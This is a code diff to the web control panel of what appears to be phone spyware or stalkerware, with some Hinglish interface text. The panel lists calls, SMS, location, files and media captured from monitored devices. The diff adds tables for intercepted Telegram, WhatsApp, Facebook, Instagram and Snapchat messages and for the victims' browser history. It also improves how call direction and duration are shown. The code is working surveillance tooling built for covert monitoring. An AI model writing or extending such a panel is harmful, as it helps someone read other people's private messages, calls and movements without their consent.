@@ -99,6 +99,8 @@ a { color: var(--accent2); text-decoration: none; }
 .stat.c-sms .num { color: var(--accent2); }
 .stat.c-loc .num { color: var(--warn); }
 .stat.c-files .num { color: #c084fc; }
+.stat.c-social .num { color: #22d3ee; }
+.stat.c-web .num { color: #fb923c; }
 
 /* ---------- Tabs ---------- */
 .tabs { display: flex; gap: 8px; overflow-x: auto; padding: 4px 2px 12px; scrollbar-width: none; }
@@ -265,6 +267,8 @@ footer { text-align: center; color: var(--muted); font-size: .72rem; padding: 30
     <div class="stat c-sms"><div class="ic">💬</div><div class="num" id="s-sms">0</div><div class="lbl">SMS / MMS</div></div>
     <div class="stat c-loc"><div class="ic">📍</div><div class="num" id="s-loc">0</div><div class="lbl">Location</div></div>
     <div class="stat c-files"><div class="ic">📁</div><div class="num" id="s-files">0</div><div class="lbl">Files</div></div>
+    <div class="stat c-social"><div class="ic">🗨️</div><div class="num" id="s-social">0</div><div class="lbl">Social</div></div>
+    <div class="stat c-web"><div class="ic">🌐</div><div class="num" id="s-web">0</div><div class="lbl">Sites</div></div>
   </div>
 
   <div class="devrow" id="devrow"></div>
@@ -276,6 +280,8 @@ footer { text-align: center; color: var(--muted); font-size: .72rem; padding: 30
     <button class="tab" data-p="sms">💬 SMS <span class="cnt" id="t-sms"></span></button>
     <button class="tab" data-p="location">📍 Location <span class="cnt" id="t-loc"></span></button>
     <button class="tab" data-p="files">📁 Files <span class="cnt" id="t-files"></span></button>
+    <button class="tab" data-p="social">🗨️ Social <span class="cnt" id="t-social"></span></button>
+    <button class="tab" data-p="web">🌐 Sites <span class="cnt" id="t-web"></span></button>
     <button class="tab" data-p="live">📺 Live</button>
     <button class="tab" data-p="all">📋 All Requests <span class="cnt" id="t-all"></span></button>
   </div>
@@ -357,6 +363,28 @@ footer { text-align: center; color: var(--muted); font-size: .72rem; padding: 30
     </div>
   </section>
 
+  <!-- SOCIAL -->
+  <section class="panel" id="p-social">
+    <div class="head"><h2>🗨️ Social Messages</h2><span class="sub">Telegram, WhatsApp, Twitter/Facebook chats</span></div>
+    <div class="tablewrap">
+      <table>
+        <thead><tr><th>Time</th><th>App</th><th>Chat / Contact</th><th>Message</th><th>Device</th></tr></thead>
+        <tbody id="tb-social"></tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- WEB -->
+  <section class="panel" id="p-web">
+    <div class="head"><h2>🌐 Browser History</h2><span class="sub">Kaunsi websites kholi gayi</span></div>
+    <div class="tablewrap">
+      <table>
+        <thead><tr><th>Time</th><th>Site</th><th>URL</th><th>Browser</th><th>Device</th></tr></thead>
+        <tbody id="tb-web"></tbody>
+      </table>
+    </div>
+  </section>
+
   <!-- LIVE -->
   <section class="panel" id="p-live">
     <div class="head"><h2>📺 Live Feed</h2><span class="sub">Har naya event yahan turant dikhega</span></div>
@@ -414,6 +442,8 @@ function kindOf(p) {
   if (p.indexOf("sms") >= 0) return "sms";
   if (p.indexOf("mms") >= 0) return "mms";
   if (p.indexOf("call") >= 0) return "call";
+  if (p.indexOf("telegram") >= 0 || p.indexOf("whatsapp") >= 0 || p.indexOf("twitter") >= 0 || p.indexOf("facebook") >= 0 || p.indexOf("instagram") >= 0 || p.indexOf("messenger") >= 0 || p.indexOf("snapchat") >= 0) return "social";
+  if (p.indexOf("sitehistory") >= 0 || p.indexOf("/site/") >= 0) return "web";
   if (p.indexOf("picture") >= 0 || p.indexOf("screenshot") >= 0) return "img";
   if (p.indexOf("video") >= 0) return "video";
   if (p.indexOf("recordaudio") >= 0 || p.indexOf("audio") >= 0) return "audio";
@@ -513,8 +543,8 @@ function exportJSON() {
 var VIEW = [];
 function renderAll() {
   VIEW = deviceFilter === "all" ? DATA.slice() : DATA.filter(function (c) { return String(c.deviceId || "0") === deviceFilter; });
-  var k, counts = { total: VIEW.length, media: 0, calls: 0, sms: 0, loc: 0, files: 0, other: 0 };
-  var byKind = { media: [], calls: [], sms: [], loc: [], files: [], other: [] };
+  var k, counts = { total: VIEW.length, media: 0, calls: 0, sms: 0, loc: 0, files: 0, social: 0, web: 0, other: 0 };
+  var byKind = { media: [], calls: [], sms: [], loc: [], files: [], social: [], web: [], other: [] };
   var epCounts = {};
   VIEW.forEach(function (c) {
     var k = kindOf(c.path);
@@ -523,14 +553,18 @@ function renderAll() {
     else if (k === "call") { counts.calls++; byKind.calls.push(c); }
     else if (k === "loc") { counts.loc++; byKind.loc.push(c); }
     else if (k === "file") { counts.files++; byKind.files.push(c); }
+    else if (k === "social") { counts.social++; byKind.social.push(c); }
+    else if (k === "web") { counts.web++; byKind.web.push(c); }
     else { counts.other++; byKind.other.push(c); }
     epCounts[c.path] = (epCounts[c.path] || 0) + 1;
   });
 
   set("s-total", counts.total); set("s-media", counts.media); set("s-calls", counts.calls);
   set("s-sms", counts.sms); set("s-loc", counts.loc); set("s-files", counts.files);
+  set("s-social", counts.social); set("s-web", counts.web);
   set("t-media", counts.media || ""); set("t-calls", counts.calls || ""); set("t-sms", counts.sms || "");
-  set("t-loc", counts.loc || ""); set("t-files", counts.files || ""); set("t-all", counts.total || "");
+  set("t-loc", counts.loc || ""); set("t-files", counts.files || "");
+  set("t-social", counts.social || ""); set("t-web", counts.web || ""); set("t-all", counts.total || "");
 
   if (VIEW.length) set("lastact", "Latest: " + fmtTime(VIEW[0].time));
 
@@ -541,6 +575,8 @@ function renderAll() {
   renderSMS(byKind.sms);
   renderLoc(byKind.loc);
   renderFiles(byKind.files);
+  renderSocial(byKind.social);
+  renderWeb(byKind.web);
   renderLive();
   renderAllTable();
 }
@@ -622,14 +658,19 @@ function renderCalls(list) {
     var f = c.fields || {};
     var type = String(f.type || f.callType || "").toLowerCase();
     var tag = "call", label = "CALL";
-    if (type.indexOf("in") >= 0 && type.indexOf("out") < 0) { tag = "call-in"; label = "INCOMING"; }
-    else if (type.indexOf("out") >= 0) { tag = "call-out"; label = "OUTGOING"; }
-    else if (type.indexOf("miss") >= 0 || type === "3") { tag = "call-miss"; label = "MISSED"; }
+    if (type === "1" || (type.indexOf("in") >= 0 && type.indexOf("out") < 0)) { tag = "call-in"; label = "INCOMING"; }
+    else if (type === "2" || type.indexOf("out") >= 0) { tag = "call-out"; label = "OUTGOING"; }
+    else if (type === "3" || type.indexOf("miss") >= 0) { tag = "call-miss"; label = "MISSED"; }
+    var dur = String(f.duration || "0");
+    if (/^\d+$/.test(dur)) {
+      var dm = Math.floor(parseInt(dur, 10) / 60), ds = parseInt(dur, 10) % 60;
+      dur = (dm > 0 ? dm + "m " : "") + ds + "s";
+    }
     return '<tr><td class="mono muted">' + fmtTime(c.time) + '</td>'
       + '<td><span class="tag ' + tag + '">' + label + '</span></td>'
       + '<td class="mono">' + esc(f.number || f.phoneNumber || "—") + '</td>'
       + '<td>' + esc(f.name || f.contact || "—") + '</td>'
-      + '<td class="mono">' + esc(f.duration || f.data || "—") + '</td>'
+      + '<td class="mono">' + esc(dur) + '</td>'
       + '<td class="mono muted clip">' + esc(JSON.stringify(f)).slice(0, 120) + '</td>'
       + '<td><span class="devtag">' + esc(devName(c)) + '</span></td></tr>';
   }).join("");
@@ -679,6 +720,46 @@ function renderFiles(list) {
       + '<td class="mono muted clip">' + esc(f.pathFile || "—") + '</td>'
       + '<td class="mono">' + fmtSize(fl && fl.size) + '</td>'
       + '<td class="mono muted">' + esc(c.path) + '</td>'
+      + '<td><span class="devtag">' + esc(devName(c)) + '</span></td></tr>';
+  }).join("");
+}
+
+function renderSocial(list) {
+  var tb = document.getElementById("tb-social");
+  if (!list.length) { tb.innerHTML = '<tr><td colspan="5" class="empty"><div class="big">🗨️</div><h3>No social messages yet</h3><p>Telegram/WhatsApp/Facebook ke chats yahan dikhenge.</p></td></tr>'; return; }
+  tb.innerHTML = list.map(function (c) {
+    var f = c.fields || {};
+    var p = String(c.path || "").toLowerCase();
+    var app = "Social";
+    if (p.indexOf("telegram") >= 0) app = "✈️ Telegram";
+    else if (p.indexOf("whatsapp") >= 0) app = "🟢 WhatsApp";
+    else if (p.indexOf("twitter") >= 0) app = "🐦 Twitter";
+    else if (p.indexOf("facebook") >= 0) app = "🔵 Facebook";
+    else if (p.indexOf("instagram") >= 0) app = "📸 Instagram";
+    else if (p.indexOf("messenger") >= 0) app = "💬 Messenger";
+    else if (p.indexOf("snapchat") >= 0) app = "👻 Snapchat";
+    var dir = String(f.type || "");
+    var dirTag = dir === "2" ? '<span class="tag call-out">OUT</span>' : dir === "1" ? '<span class="tag call-in">IN</span>' : "";
+    return '<tr><td class="mono muted">' + fmtTime(c.time) + '</td>'
+      + '<td>' + app + ' ' + dirTag + '</td>'
+      + '<td>' + esc(f.fullName || f.name || f.contact || "—") + '</td>'
+      + '<td class="clip" style="white-space:pre-wrap;max-width:340px">' + esc(f.message || f.body || f.data || "—") + '</td>'
+      + '<td><span class="devtag">' + esc(devName(c)) + '</span></td></tr>';
+  }).join("");
+}
+
+function renderWeb(list) {
+  var tb = document.getElementById("tb-web");
+  if (!list.length) { tb.innerHTML = '<tr><td colspan="5" class="empty"><div class="big">🌐</div><h3>No sites yet</h3><p>Browser history yahan dikhenge.</p></td></tr>'; return; }
+  tb.innerHTML = list.map(function (c) {
+    var f = c.fields || {};
+    var url = esc(f.url || f.nameSite || "—");
+    var link = (f.url && String(f.url).indexOf("http") !== 0 && String(f.url).indexOf(".") >= 0)
+      ? '<a href="https://' + url + '" target="_blank" rel="noopener">' + url + '</a>' : url;
+    return '<tr><td class="mono muted">' + fmtTime(f.dateUsed || c.time) + '</td>'
+      + '<td>' + esc(f.nameSite || f.url || "—") + '</td>'
+      + '<td class="mono muted clip">' + link + '</td>'
+      + '<td>' + esc(f.browser || "—") + '</td>'
       + '<td><span class="devtag">' + esc(devName(c)) + '</span></td></tr>';
   }).join("");
 }
